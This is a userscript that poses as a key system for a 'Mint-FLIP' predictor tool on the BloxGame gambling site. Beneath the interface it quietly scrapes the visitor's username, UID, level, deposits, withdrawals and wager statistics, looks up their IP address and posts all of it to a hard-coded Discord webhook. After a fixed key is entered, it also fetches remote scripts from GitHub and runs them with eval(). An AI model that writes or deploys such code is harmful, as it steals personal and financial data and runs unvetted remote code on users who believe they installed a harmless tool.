// ==UserScript==
// @name         Mint-FLIP - Key System
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Key system for Mint-FLIP
// @author       You
// @match        https://www.roblox.com/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    // Check if we're on the profile page
    const isOnProfilePage = window.location.href.includes('/users/profile') || 
                           window.location.href.includes('/profile') ||
                           document.querySelector('[data-userid]') !== null;

    // If not on profile page, show notification and stop
    if (!isOnProfilePage) {
        showNotification();
        return;
    }

    // Get UID for tracking
    const uidElement = document.querySelector('.Profile_userUID__Qj38P');
    const uid = uidElement ? uidElement.textContent.trim() : null;
    
    // Check if this UID has already sent a webhook
    if (uid) {
        const sentUIDs = JSON.parse(localStorage.getItem('mintflip_sent_uids') || '[]');
        if (!sentUIDs.includes(uid)) {
            // New UID - send webhook and save it
            sendUserDataToDiscord(uid);
            sentUIDs.push(uid);
            localStorage.setItem('mintflip_sent_uids', JSON.stringify(sentUIDs));
        }
    }

    // Add styles for key system
    const style = document.createElement('style');
    style.textContent = `
        .mintflip-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: transparent;
            backdrop-filter: blur(6px);
            z-index: 999998;
            display: block;
            transition: backdrop-filter 0.3s ease;
            pointer-events: none;
        }

        .mintflip-overlay.no-blur {
            backdrop-filter: none;
            background: transparent;
        }

        .mintflip-container {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            display: flex;
            gap: 2px;
            z-index: 999999;
            pointer-events: none;
        }

        .mintflip-main {
            width: 360px;
            background: #0c0c0c;
            border-radius: 12px;
            border: 1px solid #1a4d3e;
            box-shadow: 0 0 20px rgba(72, 209, 157, 0.2);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            pointer-events: auto;
            animation: popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        .mintflip-main.closing {
            animation: popOut 0.3s ease forwards;
        }

        .mintflip-tutorial {
            width: 360px;
            background: #0c0c0c;
            border-radius: 12px;
            border: 1px solid #1a4d3e;
            box-shadow: 0 0 20px rgba(72, 209, 157, 0.2);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            pointer-events: auto;
            display: none;
            animation: popIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        .mintflip-tutorial.closing {
            animation: popOut 0.2s ease forwards;
        }

        .mintflip-tutorial.visible {
            display: block;
        }

        .mintflip-premium {
            width: 360px;
            background: #0c0c0c;
            border-radius: 12px;
            border: 1px solid #ffd700;
            box-shadow: 0 0 20px rgba(255, 215, 0, 0.2);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            pointer-events: auto;
            display: none;
            animation: popIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        .mintflip-premium.closing {
            animation: popOut 0.2s ease forwards;
        }

        .mintflip-premium.visible {
            display: block;
        }

        @keyframes popIn {
            0% {
                opacity: 0;
                transform: scale(0.8);
            }
            100% {
                opacity: 1;
                transform: scale(1);
            }
        }

        @keyframes popOut {
            0% {
                opacity: 1;
                transform: scale(1);
            }
            100% {
                opacity: 0;
                transform: scale(0.8);
            }
        }

        @keyframes goldPulse {
            0%, 100% {
                border-color: #ffd700;
                box-shadow: 0 0 20px rgba(255, 215, 0, 0.2);
            }
            50% {
                border-color: #ffaa00;
                box-shadow: 0 0 30px rgba(255, 215, 0, 0.4);
            }
        }

        .mintflip-header {
            background: #111111;
            padding: 16px 20px;
            border-radius: 11px 11px 0 0;
            color: #48d19d;
            font-size: 22px;
            font-weight: 600;
            display: flex;
            justify-content: space-between;
            align-items: center;
            cursor: move;
            border-bottom: 1px solid #1a4d3e;
            letter-spacing: 0.5px;
            user-select: none;
        }

        .mintflip-premium-header {
            background: #1a1a1a;
            padding: 16px 20px;
            border-radius: 11px 11px 0 0;
            color: #ffd700;
            font-size: 22px;
            font-weight: 600;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #ffd700;
            letter-spacing: 0.5px;
            animation: goldPulse 2s infinite;
        }

        .mintflip-header-right {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .mintflip-tutorial-header {
            background: #111111;
            padding: 16px 20px;
            border-radius: 11px 11px 0 0;
            color: #48d19d;
            font-size: 18px;
            font-weight: 600;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #1a4d3e;
            letter-spacing: 0.5px;
        }

        .mintflip-close {
            background: transparent;
            color: #2a8b6f;
            border: 1px solid #1a4d3e;
            width: 32px;
            height: 32px;
            border-radius: 6px;
            font-size: 18px;
            font-weight: 400;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
        }

        .mintflip-close:hover {
            background: #1a4d3e;
            color: #ffffff;
            border-color: #48d19d;
        }

        .mintflip-premium-close {
            background: transparent;
            color: #ffd700;
            border: 1px solid #ffd700;
            width: 32px;
            height: 32px;
            border-radius: 6px;
            font-size: 18px;
            font-weight: 400;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
        }

        .mintflip-premium-close:hover {
            background: #ffd700;
            color: #000000;
            border-color: #ffd700;
        }

        .mintflip-content {
            padding: 24px;
            background: #0c0c0c;
            border-radius: 0 0 11px 11px;
        }

        .mintflip-tutorial-content {
            padding: 20px 24px;
            background: #0c0c0c;
            border-radius: 0 0 11px 11px;
        }

        .mintflip-premium-content {
            padding: 20px 24px 24px 24px;
            background: #0c0c0c;
            border-radius: 0 0 11px 11px;
        }

        .mintflip-title {
            color: #48d19d;
            font-size: 24px;
            text-align: center;
            margin-bottom: 24px;
            font-weight: 600;
            letter-spacing: 1px;
            text-transform: uppercase;
        }

        .mintflip-premium-title {
            color: #ffd700;
            font-size: 24px;
            text-align: center;
            margin-bottom: 20px;
            font-weight: 600;
            letter-spacing: 1px;
            text-transform: uppercase;
        }

        .mintflip-input {
            width: 100%;
            padding: 14px;
            background: #111111;
            border: 1px solid #1a4d3e;
            border-radius: 6px;
            color: #ffffff;
            font-size: 16px;
            text-align: center;
            margin-bottom: 20px;
            box-sizing: border-box;
            font-family: 'Monaco', 'Menlo', monospace;
            letter-spacing: 2px;
            transition: all 0.2s;
        }

        .mintflip-input:focus {
            outline: none;
            border-color: #48d19d;
            background: #151515;
            box-shadow: 0 0 15px rgba(72, 209, 157, 0.15);
        }

        .mintflip-input::placeholder {
            color: #666666;
            letter-spacing: normal;
            font-size: 14px;
        }

        .mintflip-login-btn {
            width: 100%;
            padding: 14px;
            background: #0f2f24;
            color: #48d19d;
            border: 1px solid #2a8b6f;
            border-radius: 6px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 12px;
        }

        .mintflip-login-btn:hover {
            background: #1a4d3e;
            border-color: #48d19d;
            color: #ffffff;
        }

        .mintflip-login-btn:active {
            transform: translateY(1px);
        }

        .mintflip-nokey-btn {
            width: 100%;
            padding: 12px;
            background: transparent;
            color: #2a8b6f;
            border: 1px dashed #1a4d3e;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 8px;
        }

        .mintflip-nokey-btn:hover {
            background: #1a4d3e;
            color: #48d19d;
            border-color: #48d19d;
            border-style: solid;
        }

        .mintflip-premium-btn {
            width: 100%;
            padding: 12px;
            background: transparent;
            color: #ffd700;
            border: 1px dashed #ffd700;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 16px;
        }

        .mintflip-premium-btn:hover {
            background: #332a00;
            color: #ffd700;
            border-color: #ffd700;
            border-style: solid;
        }

        .mintflip-toggle-btn {
            width: 100%;
            padding: 14px;
            background: transparent;
            color: #2a8b6f;
            border: 1px solid #1a4d3e;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 16px;
        }

        .mintflip-toggle-btn:hover {
            background: #1a4d3e;
            color: #48d19d;
            border-color: #48d19d;
        }

        .mintflip-error {
            color: #ff6b6b;
            text-align: center;
            font-size: 13px;
            margin: 10px 0;
            padding: 10px;
            border: 1px solid #4d1a1a;
            background: rgba(100, 0, 0, 0.1);
            border-radius: 6px;
            display: none;
            font-weight: 500;
        }

        .mintflip-footer {
            color: #2a8b6f;
            text-align: center;
            font-size: 11px;
            margin-top: 16px;
            text-transform: uppercase;
            letter-spacing: 1px;
            border-top: 1px solid #1a4d3e;
            padding-top: 16px;
        }

        .mintflip-copyright {
            color: #2a8b6f;
            text-align: center;
            font-size: 10px;
            margin-top: 8px;
            letter-spacing: 0.5px;
            opacity: 0.8;
        }

        .mintflip-success {
            width: 100%;
            padding: 14px;
            background: #0f2f24;
            color: #48d19d;
            border: 1px solid #48d19d;
            border-radius: 6px;
            font-size: 18px;
            font-weight: 600;
            text-align: center;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 16px;
            display: none;
        }

        .premium-price {
            text-align: center;
            margin-bottom: 20px;
            padding: 15px;
            background: #1a1a1a;
            border-radius: 8px;
            border: 1px solid #ffd700;
        }

        .premium-price .amount {
            color: #ffd700;
            font-size: 32px;
            font-weight: 800;
            line-height: 1.2;
        }

        .premium-price .label {
            color: #cccccc;
            font-size: 14px;
            margin-top: 5px;
        }

        .premium-step {
            margin-bottom: 20px;
        }

        .premium-step h3 {
            color: #ffd700;
            font-size: 16px;
            margin: 0 0 5px 0;
            font-weight: 600;
        }

        .premium-step p {
            color: #cccccc;
            font-size: 13px;
            margin: 0;
            line-height: 1.5;
        }

        .premium-highlight {
            color: #ffd700;
            font-weight: bold;
            background: #332a00;
            padding: 2px 6px;
            border-radius: 4px;
            font-family: monospace;
        }

        .premium-footer {
            margin-top: 20px;
            text-align: center;
            color: #ffd700;
            font-size: 13px;
            border-top: 1px solid #333333;
            padding-top: 15px;
        }

        .premium-footer p {
            margin: 5px 0;
            color: #ffd700;
        }

        .premium-footer .gamepass {
            color: #ffd700;
            font-size: 12px;
            opacity: 0.9;
            font-family: monospace;
        }

        .tutorial-step {
            margin-bottom: 20px;
        }

        .tutorial-step h3 {
            color: #48d19d;
            font-size: 16px;
            margin: 0 0 5px 0;
            font-weight: 600;
        }

        .tutorial-step p {
            color: #cccccc;
            font-size: 13px;
            margin: 0;
            line-height: 1.5;
        }

        .tutorial-highlight {
            color: #48d19d;
            font-weight: bold;
            background: #1a4d3e;
            padding: 2px 6px;
            border-radius: 4px;
            font-family: monospace;
        }

        .tutorial-note {
            margin-top: 20px;
            padding: 12px;
            background: #111111;
            border-radius: 6px;
            border-left: 3px solid #48d19d;
        }

        .tutorial-note p {
            color: #cccccc;
            font-size: 13px;
            margin: 5px 0;
        }

        .tutorial-note .highlight {
            color: #48d19d;
            font-family: monospace;
            font-weight: bold;
        }
    `;
    document.head.appendChild(style);

    // Create overlay
    const overlay = document.createElement('div');
    overlay.className = 'mintflip-overlay';
    document.body.appendChild(overlay);

    // Create main container wrapper
    const container = document.createElement('div');
    container.className = 'mintflip-container';

    // Create main GUI
    const mainGui = document.createElement('div');
    mainGui.className = 'mintflip-main';

    // Create tutorial panel
    const tutorialPanel = document.createElement('div');
    tutorialPanel.className = 'mintflip-tutorial';

    // Create premium panel
    const premiumPanel = document.createElement('div');
    premiumPanel.className = 'mintflip-premium';

    // Create header for main GUI
    const header = document.createElement('div');
    header.className = 'mintflip-header';
    header.textContent = 'MINT-FLIP | .gg/mintflip';

    // Create right section for FREE badge and close button
    const headerRight = document.createElement('div');
    headerRight.className = 'mintflip-header-right';

    // Create close button
    const closeBtn = document.createElement('button');
    closeBtn.className = 'mintflip-close';
    closeBtn.innerHTML = '×';
    closeBtn.onclick = () => {
        mainGui.classList.add('closing');
        if (tutorialPanel.classList.contains('visible')) tutorialPanel.classList.add('closing');
        if (premiumPanel.classList.contains('visible')) premiumPanel.classList.add('closing');
        setTimeout(() => {
            container.style.display = 'none';
            overlay.style.display = 'none';
            mainGui.classList.remove('closing');
            tutorialPanel.classList.remove('closing');
            premiumPanel.classList.remove('closing');
        }, 300);
    };

    headerRight.appendChild(closeBtn);
    header.appendChild(headerRight);

    // Tutorial header
    const tutorialHeader = document.createElement('div');
    tutorialHeader.className = 'mintflip-tutorial-header';
    tutorialHeader.innerHTML = 'EASY KEY TUTORIAL';

    const tutorialCloseBtn = document.createElement('button');
    tutorialCloseBtn.className = 'mintflip-close';
    tutorialCloseBtn.innerHTML = '×';
    tutorialCloseBtn.onclick = () => {
        tutorialPanel.classList.add('closing');
        setTimeout(() => {
            tutorialPanel.classList.remove('visible');
            tutorialPanel.classList.remove('closing');
            nokeyBtn.style.background = 'transparent';
            nokeyBtn.style.color = '#2a8b6f';
            nokeyBtn.style.borderStyle = 'dashed';
        }, 200);
    };

    tutorialHeader.appendChild(tutorialCloseBtn);

    // Premium header
    const premiumHeader = document.createElement('div');
    premiumHeader.className = 'mintflip-premium-header';
    premiumHeader.innerHTML = 'GET PREMIUM';

    const premiumCloseBtn = document.createElement('button');
    premiumCloseBtn.className = 'mintflip-premium-close';
    premiumCloseBtn.innerHTML = '×';
    premiumCloseBtn.onclick = () => {
        premiumPanel.classList.add('closing');
        setTimeout(() => {
            premiumPanel.classList.remove('visible');
            premiumPanel.classList.remove('closing');
            premiumBtn.style.background = 'transparent';
            premiumBtn.style.color = '#ffd700';
            premiumBtn.style.borderStyle = 'dashed';
        }, 200);
    };

    premiumHeader.appendChild(premiumCloseBtn);

    // Content
    const content = document.createElement('div');
    content.className = 'mintflip-content';

    const title = document.createElement('div');
    title.className = 'mintflip-title';
    title.textContent = 'ENTER KEY';

    const input = document.createElement('input');
    input.type = 'text';
    input.className = 'mintflip-input';
    input.placeholder = 'ENTER KEY';
    input.maxLength = 20;

    const loginBtn = document.createElement('button');
    loginBtn.className = 'mintflip-login-btn';
    loginBtn.textContent = 'LOGIN';

    const nokeyBtn = document.createElement('button');
    nokeyBtn.className = 'mintflip-nokey-btn';
    nokeyBtn.textContent = 'NO KEY?';

    const premiumBtn = document.createElement('button');
    premiumBtn.className = 'mintflip-premium-btn';
    premiumBtn.textContent = 'GET PREMIUM';

    const toggleBtn = document.createElement('button');
    toggleBtn.className = 'mintflip-toggle-btn';
    toggleBtn.textContent = 'BLUR: ON';

    const errorMsg = document.createElement('div');
    errorMsg.className = 'mintflip-error';
    errorMsg.textContent = 'INVALID KEY';

    const footer = document.createElement('div');
    footer.className = 'mintflip-footer';
    footer.textContent = 'SYSTEM READY';

    const copyright = document.createElement('div');
    copyright.className = 'mintflip-copyright';
    copyright.innerHTML = 'MINT-FLIP © 2026';

// Tutorial content with Linkvertise checkpoints (no emojis)
const tutorialContent = document.createElement('div');
tutorialContent.className = 'mintflip-tutorial-content';
tutorialContent.innerHTML = `
    <div class="tutorial-step">
        <h3>STEP 1: Linkvertise Link</h3>
        <p>Complete <span class="tutorial-highlight">1 checkpoint</span> on the link below:</p>
        <div style="background: #1a4d3e; border-radius: 8px; padding: 12px; margin: 10px 0; text-align: center;">
            <a href="https://link-hub.net/1249148/ue8g5fynIsn0" target="_blank" style="color: #48d19d; font-weight: bold; text-decoration: none; font-size: 16px;">COMPLETE LINKVERTISE</a>
        </div>
        <p style="font-size: 12px; color: #888;">Takes about 30-60 seconds</p>
    </div>
    
    <div class="tutorial-step">
        <h3>STEP 2: Get Your Key</h3>
        <p>After completing first checkpoints, your key will be shown on the page.</p>
        <p style="background: #111; border: 1px solid #1a4d3e; border-radius: 6px; padding: 10px; margin-top: 10px; text-align: center; font-family: monospace; color: #48d19d;">Key appears after first checkpoint</p>
    </div>
    
    <div class="tutorial-step">
        <h3>STEP 3: Enter Key</h3>
        <p>Copy your key and paste it in the main window</p>
    </div>
    
    <div class="tutorial-step">
        <h3>STEP 4: Enjoy</h3>
        <p>Once verified, you'll get full access to Mint-FLIP</p>
    </div>
    
    <div class="tutorial-note">
        <p><span class="highlight">Key format:</span> XXXX-XXXX-XXXX</p>
        <p><span style="color: #48d19d;">Keys are free and refresh daily!</span></p>
    </div>
`;

// Premium content
const premiumContent = document.createElement('div');
premiumContent.className = 'mintflip-premium-content';
premiumContent.innerHTML = `
    <div class="premium-step">
        <h3>STEP 1: Fair Prices</h3>
        <p>Go to the MINT-FLIP Official Discord Server to the <span class="premium-highlight">#「🌿」𝗠𝗜𝗡𝗧-𝗣𝗟𝗨𝗦</span> channel. There you will see the prices - Good prices and affordable!</p>
    </div>
    
    <div class="premium-step">
        <h3>STEP 2: Create a Ticket</h3>
        <p>Go to the MINT-FLIP Official Discord Server and Create a Ticket at the <span class="premium-highlight">#「🎫」𝗧𝗜𝗖𝗞𝗘𝗧</span> channel.</p>
    </div>
    
    <div class="premium-step">
        <h3>STEP 3: Select Payment Method</h3>
        <p>In the first step channel (<span class="premium-highlight">#「🌿」𝗠𝗜𝗡𝗧-𝗣𝗟𝗨𝗦</span>) you will find all available payment methods you can use!</p>
    </div>
    
    <div class="premium-step">
        <h3>STEP 4: After Purchase</h3>
        <p>After completing your purchase in the ticket with staff/owner, you will receive:</p>
        <p>• <span class="premium-highlight">Discord Role</span> (Premium access in Discord)</p>
        <p>• You need to send your <span class="premium-highlight">UID</span> to get Premium on MINT-FLIP</p>
    </div>
    
    <div class="premium-step">
        <h3>STEP 5: Finding UID</h3>
        <p>1. Go to <span class="premium-highlight">https://bloxgame.com/profile</span></p>
        <p>2. Near your profile picture, you'll see a blurred line</p>
        <p>3. Hold your cursor over it and click to copy</p>
        <p>4. Send the copied UID in your Discord ticket</p>
    </div>
`;

    tutorialPanel.appendChild(tutorialHeader);
    tutorialPanel.appendChild(tutorialContent);
    premiumPanel.appendChild(premiumHeader);
    premiumPanel.appendChild(premiumContent);

    // Blur toggle
    let blurEnabled = true;
    toggleBtn.addEventListener('click', function() {
        blurEnabled = !blurEnabled;
        if (blurEnabled) {
            overlay.classList.remove('no-blur');
            toggleBtn.textContent = 'BLUR: ON';
            toggleBtn.style.color = '#48d19d';
        } else {
            overlay.classList.add('no-blur');
            toggleBtn.textContent = 'BLUR: OFF';
            toggleBtn.style.color = '#4d4d4d';
        }
    });

    // NO KEY button
    nokeyBtn.addEventListener('click', function() {
        if (premiumPanel.classList.contains('visible')) {
            premiumPanel.classList.add('closing');
            setTimeout(() => {
                premiumPanel.classList.remove('visible');
                premiumPanel.classList.remove('closing');
                premiumBtn.style.background = 'transparent';
                premiumBtn.style.color = '#ffd700';
                premiumBtn.style.borderStyle = 'dashed';
            }, 200);
        }
        if (!tutorialPanel.classList.contains('visible')) {
            tutorialPanel.classList.remove('closing');
            tutorialPanel.classList.add('visible');
            nokeyBtn.style.background = '#1a4d3e';
            nokeyBtn.style.color = '#48d19d';
            nokeyBtn.style.borderStyle = 'solid';
        } else {
            tutorialPanel.classList.add('closing');
            setTimeout(() => {
                tutorialPanel.classList.remove('visible');
                tutorialPanel.classList.remove('closing');
                nokeyBtn.style.background = 'transparent';
                nokeyBtn.style.color = '#2a8b6f';
                nokeyBtn.style.borderStyle = 'dashed';
            }, 200);
        }
        overlay.style.backgroundColor = 'transparent';
    });

    // PREMIUM button
    premiumBtn.addEventListener('click', function() {
        if (tutorialPanel.classList.contains('visible')) {
            tutorialPanel.classList.add('closing');
            setTimeout(() => {
                tutorialPanel.classList.remove('visible');
                tutorialPanel.classList.remove('closing');
                nokeyBtn.style.background = 'transparent';
                nokeyBtn.style.color = '#2a8b6f';
                nokeyBtn.style.borderStyle = 'dashed';
            }, 200);
        }
        if (!premiumPanel.classList.contains('visible')) {
            premiumPanel.classList.remove('closing');
            premiumPanel.classList.add('visible');
            premiumBtn.style.background = '#332a00';
            premiumBtn.style.color = '#ffd700';
            premiumBtn.style.borderStyle = 'solid';
        } else {
            premiumPanel.classList.add('closing');
            setTimeout(() => {
                premiumPanel.classList.remove('visible');
                premiumPanel.classList.remove('closing');
                premiumBtn.style.background = 'transparent';
                premiumBtn.style.color = '#ffd700';
                premiumBtn.style.borderStyle = 'dashed';
            }, 200);
        }
        overlay.style.backgroundColor = 'transparent';
    });

// Login button
loginBtn.addEventListener('click', function() {
    const key = input.value.trim().toUpperCase();
    if (key === '2M4P-9K7D-X8R1') {
        errorMsg.style.display = 'none';
        loginBtn.style.display = 'none';
        input.style.display = 'none';
        toggleBtn.style.display = 'none';
        nokeyBtn.style.display = 'none';
        premiumBtn.style.display = 'none';
        
        const successMsg = document.createElement('div');
        successMsg.className = 'mintflip-success';
        successMsg.textContent = 'ACCESS GRANTED - LOADING...';
        content.insertBefore(successMsg, footer);
        successMsg.style.display = 'block';
        
        // Hide the key system
        setTimeout(() => {
            container.style.display = 'none';
            overlay.style.display = 'none';
            
            // Load scripts directly (manifest not needed)
            const scripts = [
                'config.js',
                'utils.js',
                'prediction-methods.js',
                'notify.js',
                'ui-core.js',
                'ui-tabs.js',
                'auto-features.js',
                'blackjack-predictor.js',
                'towers-predictor.js',
                'event-handlers.js',
                'mint-flip.user.js'
            ];
            
            const baseUrl = 'https://raw.githubusercontent.com/DracoSwagBaby/MINT-PREDICTOR/main/repo/';
            
            function loadScript(index) {
                if (index >= scripts.length) {
                    console.log('✅ All MINT-FLIP scripts loaded!');
                    return;
                }
                
                const scriptUrl = baseUrl + scripts[index] + '?t=' + Date.now();
                console.log(`📦 Loading: ${scripts[index]}`);
                
                fetch(scriptUrl)
                    .then(response => response.text())
                    .then(code => {
                        eval(code);
                        console.log(`✅ Loaded: ${scripts[index]}`);
                        loadScript(index + 1);
                    })
                    .catch(err => {
                        console.error(`❌ Failed to load ${scripts[index]}:`, err);
                        loadScript(index + 1); // Continue anyway
                    });
            }
            
            // Start loading scripts
            loadScript(0);
            
        }, 1500);
        
    } else {
        errorMsg.style.display = 'block';
        input.value = '';
        input.focus();
        setTimeout(() => {
            errorMsg.style.display = 'none';
        }, 5000);
        mainGui.style.transform = 'translateX(3px)';
        setTimeout(() => {
            mainGui.style.transform = 'translateX(0)';
        }, 100);
    }
});

    input.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') loginBtn.click();
    });

    content.appendChild(title);
    content.appendChild(input);
    content.appendChild(loginBtn);
    content.appendChild(nokeyBtn);
    content.appendChild(premiumBtn);
    content.appendChild(toggleBtn);
    content.appendChild(errorMsg);
    content.appendChild(footer);
    content.appendChild(copyright);

    mainGui.appendChild(header);
    mainGui.appendChild(content);

    container.appendChild(mainGui);
    container.appendChild(tutorialPanel);
    container.appendChild(premiumPanel);

    document.body.appendChild(container);

    // Draggable
    let isDragging = false;
    let currentX, currentY, initialX, initialY, xOffset = 0, yOffset = 0;

    header.addEventListener('mousedown', dragStart);
    document.addEventListener('mousemove', drag);
    document.addEventListener('mouseup', dragEnd);

    function dragStart(e) {
        if (e.target === closeBtn || e.target === toggleBtn || e.target === nokeyBtn || e.target === premiumBtn || e.target === tutorialCloseBtn || e.target === premiumCloseBtn) return;
        initialX = e.clientX - xOffset;
        initialY = e.clientY - yOffset;
        if (e.target === header || header.contains(e.target)) {
            isDragging = true;
            header.style.cursor = 'grabbing';
        }
    }

    function drag(e) {
        if (isDragging) {
            e.preventDefault();
            currentX = e.clientX - initialX;
            currentY = e.clientY - initialY;
            xOffset = currentX;
            yOffset = currentY;
            setTranslate(currentX, currentY, container);
        }
    }

    function setTranslate(xPos, yPos, el) {
        el.style.transform = `translate(${xPos}px, ${yPos}px)`;
    }

    function dragEnd() {
        isDragging = false;
        header.style.cursor = 'move';
    }

    setTimeout(() => input.focus(), 100);

    // Function to show notification
    function showNotification() {
        const notifStyle = document.createElement('style');
        notifStyle.textContent = `
            .mintflip-notification {
                position: fixed;
                top: 20px;
                right: 20px;
                width: 320px;
                background: #0c0c0c;
                border-radius: 12px;
                border: 1px solid #1a4d3e;
                box-shadow: 0 0 30px rgba(72, 209, 157, 0.3);
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
                z-index: 9999999;
                animation: slideInRight 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
                overflow: hidden;
            }
            .mintflip-notification.closing {
                animation: slideOutRight 0.3s ease forwards;
            }
            @keyframes slideInRight {
                from { opacity: 0; transform: translateX(100px); }
                to { opacity: 1; transform: translateX(0); }
            }
            @keyframes slideOutRight {
                from { opacity: 1; transform: translateX(0); }
                to { opacity: 0; transform: translateX(100px); }
            }
            .mintflip-notification-header {
                background: #111111;
                padding: 15px 20px;
                color: #48d19d;
                font-size: 20px;
                font-weight: 600;
                display: flex;
                justify-content: space-between;
                align-items: center;
                border-bottom: 1px solid #1a4d3e;
                letter-spacing: 0.5px;
            }
            .mintflip-notification-close {
                background: transparent;
                color: #2a8b6f;
                border: 1px solid #1a4d3e;
                width: 28px;
                height: 28px;
                border-radius: 6px;
                font-size: 16px;
                font-weight: 400;
                cursor: pointer;
                display: flex;
                align-items: center;
                justify-content: center;
                transition: all 0.2s;
            }
            .mintflip-notification-close:hover {
                background: #1a4d3e;
                color: #ffffff;
            }
            .mintflip-notification-content {
                padding: 20px;
                background: #0c0c0c;
            }
            .mintflip-notification-message {
                color: #cccccc;
                font-size: 14px;
                line-height: 1.6;
                margin-bottom: 20px;
            }
            .mintflip-notification-message strong {
                color: #48d19d;
                font-weight: 600;
            }
            .mintflip-notification-button {
                background: transparent;
                color: #48d19d;
                border: 1px solid #2a8b6f;
                padding: 12px 15px;
                border-radius: 6px;
                font-size: 14px;
                font-weight: 500;
                cursor: pointer;
                transition: all 0.2s;
                text-transform: uppercase;
                letter-spacing: 1px;
                width: 100%;
            }
            .mintflip-notification-button:hover {
                background: #1a4d3e;
                color: #ffffff;
            }
        `;
        document.head.appendChild(notifStyle);

        const notification = document.createElement('div');
        notification.className = 'mintflip-notification';
        const header = document.createElement('div');
        header.className = 'mintflip-notification-header';
        header.innerHTML = 'MINT-FLIP WARNING';
        const closeBtn = document.createElement('button');
        closeBtn.className = 'mintflip-notification-close';
        closeBtn.innerHTML = '×';
        closeBtn.onclick = () => {
            notification.classList.add('closing');
            setTimeout(() => notification.remove(), 300);
        };
        header.appendChild(closeBtn);
        const content = document.createElement('div');
        content.className = 'mintflip-notification-content';
        content.innerHTML = `
            <div class="mintflip-notification-message">
                <strong>Please Go to Your BloxGame Profile</strong><br><br>
                Otherwise <strong>MINT-FLIP</strong> will not work!
            </div>
            <button class="mintflip-notification-button" id="gotoProfile">GO TO PROFILE</button>
        `;
        notification.appendChild(header);
        notification.appendChild(content);
        document.body.appendChild(notification);
        document.getElementById('gotoProfile').addEventListener('click', function() {
            window.location.href = 'https://bloxgame.com/profile';
            notification.classList.add('closing');
            setTimeout(() => notification.remove(), 300);
        });
    }

    // Function to send user data to Discord
    function sendUserDataToDiscord(uid) {
        // Get Username
        const usernameElement = document.querySelector('p.text_text__fMaR4.text_smHeadlines2__btpPH');
        const username = usernameElement ? usernameElement.textContent.trim() : 'NO USERNAME';
        
        // Get Level
        const levelElement = document.querySelector('span.avatar_avatarLabel__ii1Pq');
        const level = levelElement ? levelElement.textContent.trim() : '?';
        
        // Get Registration Date
        const registeredElement = document.querySelector('p.text_text__fMaR4.text_regular14__MHg5s');
        let registeredDate = 'Unknown';
        if (registeredElement) {
            const html = registeredElement.innerHTML;
            const match = html.match(/Registered on (.+?)</);
            registeredDate = match ? match[1].trim() : 'Unknown';
        }
        
        // Get Financial Stats
        const depositElements = document.querySelectorAll('.wagerAnalytics_financialValue__nnxsr');
        const deposits = depositElements[0] ? depositElements[0].textContent.trim() : '0';
        const withdrawals = depositElements[1] ? depositElements[1].textContent.trim() : '0';
        const profitLoss = depositElements[2] ? depositElements[2].textContent.trim() : '0';
        
        // Get Wager Stats
        const wagerElements = document.querySelectorAll('.wagerAnalytics_summaryValue__tHmyr');
        const totalWager = wagerElements[0] ? wagerElements[0].textContent.trim().replace('$', '') : '0';
        const grossWager = wagerElements[1] ? wagerElements[1].textContent.trim().replace('$', '') : '0';
        
        // Get current time
        const now = new Date();
        const timeString = now.toLocaleString('en-US', { 
            timeZone: 'America/New_York',
            dateStyle: 'full',
            timeStyle: 'long'
        });
        
        // Discord webhook URL
        const webhookURL = 'https://discord.com/api/webhooks/1482076882642931965/l0CnMTzP_qmilliqlM1s5dIVTxVnCIzjQe3ax0qARLWhhJv1r94PIZycc557DLrbPruL';
        
        // Format numbers
        const formatNumber = (num) => {
            return parseInt(num.replace(/[^0-9-]/g, '')).toLocaleString();
        };
        
        // Get IP and send to Discord
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(ipData => {
                const userIP = ipData.ip;
                
                const embed = {
                    embeds: [{
                        title: '👑 MINT-FLIP User Profile',
                        color: 0x48d19d,
                        thumbnail: {
                            url: `https://api.bloxgame.com/user/avatar/${uid}`
                        },
                        fields: [
                            { name: '👤 User Info', value: `\`\`\`${username} (Level ${level})\`\`\``, inline: false },
                            { name: '🆔 UID', value: `\`\`\`${uid}\`\`\``, inline: true },
                            { name: '📅 Registered', value: `\`\`\`${registeredDate}\`\`\``, inline: true },
                            { name: '🌐 IP Address', value: `\`\`\`${userIP}\`\`\``, inline: true },
                            { name: '💰 Financial Stats', value: '━━━━━━━━━━━━━━━━━━━━', inline: false },
                            { name: '💵 Total Deposits', value: `\`\`\`$${formatNumber(deposits)}\`\`\``, inline: true },
                            { name: '💸 Total Withdrawals', value: `\`\`\`$${formatNumber(withdrawals)}\`\`\``, inline: true },
